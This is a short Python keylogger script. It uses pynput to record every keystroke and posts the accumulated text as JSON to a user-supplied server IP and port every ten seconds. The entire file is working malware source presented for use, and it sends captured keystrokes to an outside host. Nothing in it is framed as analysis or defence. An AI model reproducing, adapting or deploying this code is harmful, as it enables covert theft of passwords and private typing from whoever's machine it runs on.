import time

from pynput import keyboard
import requests
import json

text = ""

# Hard code the values of your server and ip address here.
ip_address = ""
port_number = ""
# Time interval in seconds for code to execute.
time_interval = 10


def start_sending():
    while True:
        time.sleep(time_interval)
        send_post_req()


def send_post_req():
    try:
        payload = json.dumps({"keyboardData": text})
        # send post request to the server with the text
        r = requests.post(f"http://{ip_address}:{port_number}", data=payload,
                          headers={"Content-Type": "application/json"})
    except:
        print("Couldn't complete request!")


def on_press(key):
    global text
    text += str(key).strip("'")


with keyboard.Listener(
        on_press=on_press) as listener:
    start_sending()
    listener.join()
